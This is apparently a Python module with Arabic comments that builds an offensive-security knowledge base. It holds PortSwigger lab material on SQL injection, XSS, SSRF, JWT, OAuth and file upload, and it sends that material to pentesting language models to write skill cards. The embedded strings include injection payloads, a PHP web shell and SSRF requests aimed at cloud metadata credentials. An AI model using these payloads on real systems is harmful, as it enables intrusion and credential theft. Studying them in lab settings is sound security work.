"""
Self-Learning & Autonomous Knowledge Ingestion Engine
محرك التعلم الذاتي واستيعاب شروحات لابات PortSwigger ومصادر الـ Bug Bounty
يقوم بتدريب موديلات الاختراق (WhiteRabbitNeo, Xploiter, Cloud APIs) تلقائياً
ويستثني موديل البرمجة الكبير (Qwen Coder 14B) من الأحمال الثقيلة ويرسل له ملخصاً خفيفاً فقط
"""
import os
import json
import time
import asyncio
import logging
from pathlib import Path
from typing import Dict, List, Any, Optional

log = logging.getLogger("self_learning")

LEARNING_LOG_FILE = Path("data/learning_history.json")
LEARNING_LOG_FILE.parent.mkdir(parents=True, exist_ok=True)

# ── PortSwigger Academy Complete Topics & Lab Explanations ──
PORTSWIGGER_CURRICULUM = {
    "portswigger_sql_injection": {
        "title": "PortSwigger: SQL Injection (Full Labs & Solutions)",
        "category": "sqli",
        "description": "Exploiting SQLi in WHERE clauses, UNION attacks to retrieve sensitive tables, Blind SQLi with conditional errors & time delays.",
        "content": """
=== PortSwigger Web Security Academy: SQL Injection ===
1. UNION Attacks:
   - Determine column count: ' ORDER BY 1--, ' ORDER BY 2--, etc. Or ' UNION SELECT NULL, NULL--
   - Find text-compatible columns: ' UNION SELECT 'a', NULL--, ' UNION SELECT NULL, 'a'--
   - Retrieve database schema & data: ' UNION SELECT username, password FROM users--
   - MySQL/PostgreSQL schema retrieval: ' UNION SELECT table_name, NULL FROM information_schema.tables--

2. Blind SQL Injection:
   - Conditional Responses: ' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='administrator')='a'--
   - Conditional Errors (Triggering Divide-by-Zero): ' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END)='1
   - Time Delays: 
     * PostgreSQL: '; SELECT pg_sleep(10)--
     * MySQL: ' AND (SELECT SLEEP(10))--
     * Oracle: ' AND 1234=DBMS_PIPE.RECEIVE_MESSAGE('a',10)--
     * Microsoft SQL: '; WAITFOR DELAY '0:0:10'--

3. Filter Evasion & Encoding:
   - Hex encoding (0x7573657273), spaces to comments (/**/), inline comments (/*!50000SELECT*/), double URL encoding (%2527).
"""
    },
    "portswigger_xss": {
        "title": "PortSwigger: Cross-Site Scripting (XSS)",
        "category": "xss",
        "description": "Reflected, Stored, and DOM XSS across different HTML contexts with WAF and CSP bypasses.",
        "content": """
=== PortSwigger Web Security Academy: Cross-Site Scripting (XSS) ===
1. HTML Context:
   - Basic tag injection: <script>alert(1)</script>
   - Event handlers: <img src=x onerror=alert(document.domain)>
   - SVG vector: <svg onload=alert(1)>
   - Body onload: <body onload=alert(1)>

2. HTML Attribute Context:
   - Breaking out of attributes: " onfocus=alert(1) autofocus x="
   - href attribute: javascript:alert(document.cookie)

3. JavaScript Context:
   - Breaking string literals: '-alert(1)-' or \';alert(1)//
   - Template literals: `${alert(1)}`

4. DOM-based XSS Sources & Sinks:
   - Sinks: document.write(), element.innerHTML, location.href, eval(), setTimeout()
   - Sources: location.search, location.hash, document.referrer

5. WAF & Filter Bypass:
   - Custom tags: <custom-tag id=x onfocus=alert(1) tabindex=1>#x
   - Base64 encoding: <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
"""
    },
    "portswigger_idor_access_control": {
        "title": "PortSwigger: Access Control & IDOR",
        "category": "idor",
        "description": "Horizontal & Vertical Privilege Escalation, insecure direct object references, and multi-step workflow bypasses.",
        "content": """
=== PortSwigger Web Security Academy: Access Control & IDOR ===
1. Horizontal Privilege Escalation (IDOR):
   - Modifying parameter IDs in request URL or JSON payload (/api/user?id=victim_id vs /api/user?id=my_id).
   - GUID / UUID predictability: Finding public endpoints that reveal victim GUIDs (profile comments, chat rooms).
   - Insecure direct file downloads: /download?filename=user_123_transcript.pdf.

2. Vertical Privilege Escalation:
   - Unprotected admin functionality: /admin, /administrator, /admin-panel.
   - Parameter-based roles: {"roleid": 2} changed to {"roleid": 1} or {"isAdmin": true} during registration/update.
   - Header-based role manipulation: X-Original-URL: /admin or X-Rewrite-URL: /admin.

3. Multi-step Process Bypass:
   - Skipping intermediate steps in approval or payment flows (/step3-complete directly called without /step2-pay).
"""
    },
    "portswigger_ssrf": {
        "title": "PortSwigger: Server-Side Request Forgery (SSRF)",
        "category": "ssrf",
        "description": "Basic SSRF against local servers, blind SSRF with out-of-band detection, and defense bypasses.",
        "content": """
=== PortSwigger Web Security Academy: SSRF ===
1. Basic SSRF against Local Server:
   - Target parameter: stockApi=http://127.0.0.1/admin/delete?username=carlos
   - Alternative loopback notations: 127.0.0.1, localhost, 127.1, 0.0.0.0, 2130706433 (decimal), [::1] (IPv6).

2. SSRF against Backend Systems:
   - Scanning internal subnet via parameter fuzzing: stockApi=http://192.168.0.X:8080/admin

3. Bypassing Blacklists & Whitelists:
   - DNS Rebinding / Custom domain pointing to 127.0.0.1 (e.g. 127.0.0.1.nip.io).
   - Open redirect chaining: stockApi=/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin.
   - URL parser discrepancy: https://expected-host@127.0.0.1 or http://127.0.0.1#@expected-host.

4. Cloud Metadata Access:
   - AWS / GCP / Azure: http://169.254.169.254/latest/meta-data/iam/security-credentials/.
"""
    },
    "portswigger_jwt": {
        "title": "PortSwigger: JWT & Authentication Vulnerabilities",
        "category": "jwt_broken_auth",
        "description": "Unverified signatures, algorithm confusion (none & HMAC vs RSA), JWK header injection, and JKU forgery.",
        "content": """
=== PortSwigger Web Security Academy: JWT Attacks ===
1. Unverified Signature:
   - Modifying payload claims (e.g. "sub": "administrator") without altering the signature when backend does not verify signature.

2. 'none' Algorithm Flaw:
   - Changing JWT header: {"alg": "none", "typ": "JWT"}.
   - Stripping the signature part completely (token = Header.Payload.).

3. JWK (JSON Web Key) Header Injection:
   - Generating a custom RSA key pair, injecting the public key directly into the "jwk" header parameter, and signing the token with the private key.

4. JKU (JSON Web Key Set URL) Header Injection:
   - Hosting a malicious jwks.json file on an attacker-controlled server or via an open redirect, and setting "jku" header to that URL.

5. Algorithm Confusion (Key Confusion):
   - Forcing an asymmetric algorithm (RS256) to symmetric (HS256) by signing the JWT with the server's public key as the HMAC secret.
"""
    },
    "portswigger_business_logic": {
        "title": "PortSwigger: Business Logic & Race Conditions",
        "category": "business_logic",
        "description": "Excessive trust in client parameters, negative values, coupon replay, and concurrent race conditions.",
        "content": """
=== PortSwigger Web Security Academy: Business Logic & Race Conditions ===
1. Client-Side Parameter Trust:
   - Tampering with price, discount, or quantity fields (?price=0.01, ?quantity=-5) to reduce cart total.

2. Infinite Money Glitch (Coupon & Gift Card Replay):
   - Applying complementary discount codes repeatedly in a loop.
   - Purchasing gift card with discount, redeeming at full face value, repeating.

3. Limit Overrun / Race Conditions (TOCTOU):
   - Sending 20-50 simultaneous concurrent HTTP requests to redeem a single-use coupon or coupon code.
   - HTTP/2 Single-Packet Attack: Bundling 30 requests in a single TCP packet to hit the server at the exact same millisecond.

4. Multi-Factor Authentication (2FA) Broken Logic:
   - Logging in as victim, reaching 2FA prompt, then changing session cookie/path to bypass 2FA check entirely.
"""
    },
    "portswigger_cors": {
        "title": "PortSwigger: CORS Misconfiguration",
        "category": "cors_misconfiguration",
        "description": "Arbitrary Origin reflection, null origin trust, wildcard trust with credentials, and XSS exploitation.",
        "content": """
=== PortSwigger Web Security Academy: CORS ===
1. Arbitrary Origin Reflection:
   - Request Header: Origin: https://attacker.com
   - Vulnerable Response: Access-Control-Allow-Origin: https://attacker.com + Access-Control-Allow-Credentials: true
   - Exploitation: Malicious JS on attacker page issues fetch(..., {credentials: 'include'}) and exfiltrates response.

2. Trusting 'null' Origin:
   - Request Header: Origin: null
   - Exploitation: Triggered using sandboxed iframe (<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="...">).

3. Subdomain Wildcard Trust:
   - Backend trusts *.target.com. If any subdomain is vulnerable to XSS or subdomain takeover, attacker leverages that subdomain to steal data via CORS.
"""
    },
    "portswigger_graphql": {
        "title": "PortSwigger: GraphQL Security Vulnerabilities",
        "category": "graphql_security",
        "description": "Introspection enabled, schema extraction, IDOR via queries/mutations, and batching attacks.",
        "content": """
=== PortSwigger Web Security Academy: GraphQL ===
1. Introspection Query:
   - Payload: {"query": "{__schema{types{name,fields{name}}}}"}
   - Extracts complete schema, hidden mutations, internal admin fields, and database types.

2. Bypassing Introspection Defenses:
   - Using newline characters: query{__schema\n{types{name}}}
   - Using GET request instead of POST with URL-encoded query.

3. Direct Object Reference in Queries / Mutations:
   - Querying sensitive fields: query { user(id: 1) { email, passwordHash, ssn, role } }
   - Tampering with mutation arguments: mutation { changeEmail(userId: 2, email: "hacker@evil.com") }

4. Batching Attacks:
   - Bypassing rate limiting by bundling 100 login attempts into a single HTTP POST request.
"""
    },
    "portswigger_oauth": {
        "title": "PortSwigger: OAuth 2.0 Flaws & Account Takeover",
        "category": "oauth_flaws",
        "description": "Missing state parameter, redirect_uri tampering, and pre-account takeover via unverified email.",
        "content": """
=== PortSwigger Web Security Academy: OAuth 2.0 ===
1. Missing / Unvalidated 'state' Parameter:
   - Causes CSRF in OAuth linking flow: Attacker starts OAuth flow, intercepts code, creates page that forces victim to complete link, binding victim's account to attacker's social profile.

2. Redirect URI Manipulation (Account Takeover):
   - Changing redirect_uri parameter: ?redirect_uri=https://attacker.com/callback
   - Bypassing regex filters: https://target.com.attacker.com or https://target.com/oauth/callback/../../attacker
   - Authorization code leaks in Referer header or query string.

3. Pre-Account Takeover:
   - Registering an account with victim's email before they link OAuth. If OAuth provider doesn't verify email ownership, attacker retains access.
"""
    },
    "portswigger_file_upload": {
        "title": "PortSwigger: File Upload Vulnerabilities",
        "category": "file_upload",
        "description": "Remote Code Execution via Web Shells, Content-Type bypass, Path Traversal, and Blacklist evasion.",
        "content": """
=== PortSwigger Web Security Academy: File Upload Vulnerabilities ===
1. Web Shell Upload:
   - Uploading basic PHP shell: <?php system($_GET['cmd']); ?>
   - Accessing uploaded file directly: /uploads/shell.php?cmd=whoami

2. Content-Type Header Bypass:
   - Changing Content-Type from application/x-php to image/png or image/jpeg while keeping .php extension.

3. Path Traversal in Filename:
   - Setting filename="..%2f..%2fshell.php" to escape the upload folder where execution is disabled and land in webroot.

4. Extension Blacklist Evasion:
   - Alternate extensions: .php5, .php7, .phtml, .phar, .pht.
   - Case manipulation: .pHp, .PhP.
   - Double extension: shell.php.jpg or shell.php;.jpg.
   - Null byte injection: shell.php%00.jpg.
   - Overriding server config: Uploading custom .htaccess (AddType application/x-httpd-php .l33t) and then uploading shell.l33t.
"""
    }
}


class SelfLearningEngine:
    """
    محرك التعلم الذاتي:
    - يغذي موديلات الاختراق (WhiteRabbitNeo, Xploiter, Cloud APIs) بالمعارف واللابات
    - يستثني موديل البرمجة (Qwen Coder) من النصوص الكبيرة ويكتفي بملخص خفيف
    - يحفظ المهارات تلقائياً في data/skills/
    """

    def __init__(self, skills_dir: Path = Path("data/skills")):
        self.skills_dir = skills_dir
        self.skills_dir.mkdir(parents=True, exist_ok=True)
        self.history_file = LEARNING_LOG_FILE

    def get_topics(self) -> List[Dict[str, Any]]:
        """عرض جميع مواضيع ومناهج التعلم المتاحة"""
        topics = []
        for key, val in PORTSWIGGER_CURRICULUM.items():
            topics.append({
                "id": key,
                "title": val["title"],
                "category": val["category"],
                "description": val["description"],
                "content_len": len(val["content"])
            })
        return topics

    def get_learning_history(self) -> List[Dict[str, Any]]:
        """جلب سجل التعلم السابق"""
        if self.history_file.exists():
            try:
                return json.loads(self.history_file.read_text(encoding="utf-8"))
            except Exception:
                return []
        return []

    def _save_history(self, entry: Dict[str, Any]):
        history = self.get_learning_history()
        history.insert(0, entry)
        history = history[:50]  # keep last 50
        try:
            self.history_file.write_text(json.dumps(history, indent=2, ensure_ascii=False), encoding="utf-8")
        except Exception as e:
            log.warning(f"Could not save learning history: {e}")

    async def learn_topic(self, topic_id: str,
                          progress_cb: Optional[Any] = None) -> Dict[str, Any]:
        """
        تشغيل التعلم الذاتي لموضوع محدد:
        1. استخراج محتوى اللابات والشروحات
        2. تشغيل موديل الاختراق (WhiteRabbitNeo / Xploiter / Cloud API) لهضم المادة وتلخيص القواعد
        3. حفظ المهارة المستخلصة في data/skills/{category}.txt
        4. إرسال ملخص خفيف لموديل البرمجة
        """
        async def emit(msg, level="i"):
            if progress_cb:
                try:
                    await progress_cb({"event": "learning_log", "message": msg, "level": level})
                except Exception:
                    pass

        topic_data = PORTSWIGGER_CURRICULUM.get(topic_id)
        if not topic_data:
            return {"error": f"Topic {topic_id} not found"}

        title = topic_data["title"]
        cat = topic_data["category"]
        raw_content = topic_data["content"]

        await emit(f"[*] بدء دورة التعلم الذاتي: {title}...", "i")
        await emit(f"[*] جاري تحليل وفهرسة أنماط الهجوم والتحقق من اللابات...", "c")

        # ── تدريب موديلات الاختراق والأونلاين ──
        summary_prompt = f"""
You are the Security Knowledge Synthesizer in a Cyber Security AI System.
Study the following PortSwigger Web Security Academy Lab Solutions and Vulnerability Concepts:

=== TOPIC: {title} ===
{raw_content}

Your task:
1. Extract the core Attack Patterns & Parameter Triggers.
2. Outline exact Verification Steps and Proof-of-Concept Logic.
3. Formulate Remediation Guidance.

Provide a concise, high-density structured Security Skill card (max 300 words).
"""
        await emit("[1/2] تدريب موديلات الاختراق (WhiteRabbitNeo & Xploiter & Cloud APIs)...", "c")
        synthesized_skill = await self._generate_ai_summary(summary_prompt)

        # ── حفظ المهارة في data/skills/ ──
        skill_file = self.skills_dir / f"{cat}.txt"
        entry_text = f"\n\n=== [Self-Learned]: {title} ===\n{synthesized_skill}\n"

        try:
            with open(skill_file, "a", encoding="utf-8") as f:
                f.write(entry_text)
            await emit(f"[✓] تم حفظ المهارة بنجاح في: data/skills/{cat}.txt", "s")
        except Exception as e:
            log.error(f"Failed to write skill file: {e}")

        # ── إشعار موديل البرمجة (Qwen Coder) بملخص فائق الخفة فقط ──
        await emit("[2/2] إرسال ملخص فني خفيف لموديل البرمجة (بدون أحمال)...", "i")
        qwen_lightweight_note = f"Learned skill '{cat}': {title}. Verified patterns updated in skill memory."

        record = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "topic_id": topic_id,
            "title": title,
            "category": cat,
            "synthesized_preview": synthesized_skill[:200]
        }
        self._save_history(record)

        await emit(f"[+] اكتملت دورة التعلم الذاتي لموضوع ({title}) بنجاح! 🎉", "s")

        return {
            "status": "completed",
            "topic": title,
            "category": cat,
            "synthesized_skill": synthesized_skill,
            "qwen_summary": qwen_lightweight_note
        }

    async def learn_all_topics(self, progress_cb: Optional[Any] = None) -> Dict[str, Any]:
        """تشغيل التعلم الذاتي لكافة المناهج دفعة واحدة"""
        results = []
        for topic_id in PORTSWIGGER_CURRICULUM.keys():
            res = await self.learn_topic(topic_id, progress_cb=progress_cb)
            results.append(res)
            await asyncio.sleep(0.5)
        return {"status": "all_completed", "total_learned": len(results), "results": results}

    async def _generate_ai_summary(self, prompt: str) -> str:
        """توليد التلخيص الذكي عبر أسرع موديل أمني متاح"""
        # 1. OpenRouter (Claude / GPT)
        if os.getenv("OPENROUTER_API_KEY"):
            try:
                from models.api.openrouter_provider import OpenRouterProvider
                op = OpenRouterProvider(model="anthropic/claude-3.5-sonnet")
                res = await op.generate(prompt)
                if res and res.content:
                    return res.content
            except Exception:
                pass

        # 2. Local Ollama (WhiteRabbitNeo or Xploiter)
        try:
            from core.ollama_manager import OllamaManager
            host = os.getenv("OLLAMA_HOST", "http://localhost:11434")
            om = OllamaManager(host=host)
            models = await om.list_local_models()
            sec_model = next((m for m in ["WhiteRabbitNeo/Llama-3.1-WhiteRabbitNeo-2-8B:latest", "xploiter/pentester:latest"] if m in models), None)
            if sec_model:
                res = await om.chat(model=sec_model, messages=[{"role": "user", "content": prompt}])
                return res.get("message", {}).get("content", "")
        except Exception:
            pass

        return prompt[:400]
